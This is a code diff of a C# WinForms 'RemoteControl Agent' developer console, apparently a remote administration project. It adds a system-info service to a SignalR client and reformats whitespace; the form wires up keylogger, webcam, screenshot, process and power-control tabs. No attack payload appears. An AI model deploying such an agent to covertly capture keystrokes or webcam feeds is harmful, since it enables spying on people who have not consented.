@@ -17,6 +17,10 @@ public class AgentDebugForm : Form
     // Services
     private readonly WebCamService _webCamService;
     private readonly KeyLoggerService _keyLoggerService;
+
+    // ✅ NEW: SystemInfoService để truyền vào SignalRClientService ctor mới
+    private readonly SystemInfoService _systemInfoService;
+
     private readonly SignalRClientService _signalRService;
     private readonly Microsoft.Extensions.Configuration.IConfiguration _configuration;
 
@@ -47,11 +51,14 @@ public class AgentDebugForm : Form
         _commandHandler = new CommandHandler();
         _webCamService = new WebCamService();
         _keyLoggerService = new KeyLoggerService();
-        
-        // Init SignalR
-        _signalRService = new SignalRClientService(_commandHandler, _configuration);
+
+        // ✅ NEW: init SystemInfoService
+        _systemInfoService = new SystemInfoService();
+
+        // Init SignalR (ctor mới)
+        _signalRService = new SignalRClientService(_commandHandler, _systemInfoService, _configuration);
         _signalRService.OnStatusChanged += (msg) => this.Invoke(() => UpdateStatus(msg));
-        _signalRService.OnConnectionStateChanged += (state) => this.Invoke(() => 
+        _signalRService.OnConnectionStateChanged += (state) => this.Invoke(() =>
         {
             this.Text = $"RemoteControl Agent - Developer Console [{state}]";
         });
@@ -72,7 +79,7 @@ public class AgentDebugForm : Form
 
         // Main Container Panel
         var mainPanel = new Panel { Dock = DockStyle.Fill };
-        
+
         // Status Bar at BOTTOM
         _lblStatus = new Label
         {
@@ -86,8 +93,8 @@ public class AgentDebugForm : Form
         };
 
         // Tab Control fills remaining space
-        _tabControl = new TabControl 
-        { 
+        _tabControl = new TabControl
+        {
             Dock = DockStyle.Fill,
             Font = new Font("Segoe UI", 10F),
             Padding = new Point(8, 4)
@@ -96,7 +103,7 @@ public class AgentDebugForm : Form
         // WinForms LIFO Docking: Add Status LAST so it docks to Bottom FIRST
         mainPanel.Controls.Add(_lblStatus);
         mainPanel.Controls.Add(_tabControl);
-        
+
         this.Controls.Add(mainPanel);
 
         InitDashboardTab();
@@ -109,23 +116,23 @@ public class AgentDebugForm : Form
         // Disable TabStop for all controls to allow KeyLogger testing
         DisableTabStop(this);
     }
-    
+
     // =================================================================================
     // TAB 6: POWER CONTROL
     // =================================================================================
     private void InitPowerTab()
     {
         var tab = new TabPage("Power") { Padding = new Padding(20) };
-        var layout = new FlowLayoutPanel 
-        { 
-            Dock = DockStyle.Fill, 
+        var layout = new FlowLayoutPanel
+        {
+            Dock = DockStyle.Fill,
             FlowDirection = FlowDirection.TopDown,
             WrapContents = false,
             AutoScroll = true
         };
 
-        var lblWarning = new Label 
-        { 
+        var lblWarning = new Label
+        {
             Text = "⚠️ WARNING: These actions will affect the host machine immediately!",
             ForeColor = Color.Red,
             AutoSize = true,
@@ -142,7 +149,7 @@ public class AgentDebugForm : Form
         tab.Controls.Add(layout);
         _tabControl.TabPages.Add(tab);
     }
-    
+
     private Button CreatePowerBtn(string text, Color color, CommandType type)
     {
         var btn = new Button
@@ -156,9 +163,9 @@ public class AgentDebugForm : Form
             Margin = new Padding(5),
             Font = new Font("Segoe UI", 11F)
         };
-        btn.Click += (s, e) => 
+        btn.Click += (s, e) =>
         {
-            if (MessageBox.Show($"Are you sure you want to {text}?", "Confirm Power Action", 
+            if (MessageBox.Show($"Are you sure you want to {text}?", "Confirm Power Action",
                 MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
             {
                 var result = _commandHandler.HandleCommand(new CommandRequest { Type = type });
@@ -248,7 +255,7 @@ public class AgentDebugForm : Form
     private void InitProcessTab()
     {
         var tab = new TabPage("Processes") { Padding = new Padding(5) };
-        
+
         // Toolbar at TOP with fixed height
         var toolbar = new Panel { Dock = DockStyle.Top, Height = 40 };
         var btnRefresh = Btn("Refresh", Color.Teal, 5, 5);
@@ -284,7 +291,7 @@ public class AgentDebugForm : Form
     private void InitScreenshotTab()
     {
         var tab = new TabPage("Screenshot") { Padding = new Padding(5) };
-        
+
         // Bottom bar with fixed height
         var bottomBar = new Panel { Dock = DockStyle.Bottom, Height = 40 };
         var btnCapture = Btn("📷 Capture", Color.RoyalBlue, 5, 5);
@@ -293,10 +300,10 @@ public class AgentDebugForm : Form
         bottomBar.Controls.AddRange(new Control[] { btnCapture, _lblScreenshotInfo });
 
         // PictureBox fills remaining
-        _pbScreenshot = new PictureBox 
-        { 
-            Dock = DockStyle.Fill, 
-            SizeMode = PictureBoxSizeMode.Zoom, 
+        _pbScreenshot = new PictureBox
+        {
+            Dock = DockStyle.Fill,
+            SizeMode = PictureBoxSizeMode.Zoom,
             BackColor = Color.Black
         };
 
@@ -319,7 +326,7 @@ public class AgentDebugForm : Form
                     byte[] bytes = Convert.FromBase64String(screen.ImageBase64);
                     using var ms = new MemoryStream(bytes);
                     var img = Image.FromStream(ms);
-                    
+
                     this.Invoke(() =>
                     {
                         var old = _pbScreenshot.Image;
@@ -350,10 +357,10 @@ public class AgentDebugForm : Form
         bottomBar.Controls.AddRange(new Control[] { _btnStartCam, _btnStopCam });
 
         // PictureBox fills remaining
-        _pbWebcam = new PictureBox 
-        { 
-            Dock = DockStyle.Fill, 
-            SizeMode = PictureBoxSizeMode.Zoom, 
+        _pbWebcam = new PictureBox
+        {
+            Dock = DockStyle.Fill,
+            SizeMode = PictureBoxSizeMode.Zoom,
             BackColor = Color.Black
         };
 
@@ -367,7 +374,7 @@ public class AgentDebugForm : Form
         _btnStartCam.Enabled = false;
         _btnStopCam.Enabled = true;
         _btnStopCam.BackColor = Color.IndianRed;
-        
+
         _webCamService.Start(frame =>
         {
             try
@@ -391,9 +398,9 @@ public class AgentDebugForm : Form
     {
         _btnStopCam.Enabled = false;
         UpdateStatus("Stopping webcam...");
-        
+
         await Task.Run(() => _webCamService.Stop());
-        
+
         _btnStartCam.Enabled = true;
         _btnStopCam.BackColor = Color.Gray;
         _pbWebcam.Image = null;
@@ -417,12 +424,12 @@ public class AgentDebugForm : Form
         topBar.Controls.AddRange(new Control[] { _btnStartKeyLog, _btnStopKeyLog });
 
         // TextBox fills remaining
-        _txtKeyLogs = new TextBox 
-        { 
-            Dock = DockStyle.Fill, 
-            Multiline = true, 
-            ReadOnly = true, 
-            BackColor = Color.FromArgb(30, 30, 30), 
+        _txtKeyLogs = new TextBox
+        {
+            Dock = DockStyle.Fill,
+            Multiline = true,
+            ReadOnly = true,
+            BackColor = Color.FromArgb(30, 30, 30),
             ForeColor = Color.LawnGreen,
             Font = new Font("Consolas", 11),
             ScrollBars = ScrollBars.Both
@@ -460,9 +467,9 @@ public class AgentDebugForm : Form
         _btnStopKeyLog.Enabled = false;
         UpdateStatus("Stopping keylogger...");
         _logTimer.Stop();
-        
+
         await Task.Run(() => _keyLoggerService.StopLogging());
-        
+
         _btnStartKeyLog.Enabled = true;
         _btnStopKeyLog.BackColor = Color.Gray;
         UpdateStatus("KeyLogger stopped");
@@ -559,7 +566,7 @@ public class AgentDebugForm : Form
     {
         _sysInfoTimer?.Stop();
         _logTimer?.Stop();
-        
+
         // Stop services on background to prevent freeze
         Task.Run(() =>
         {
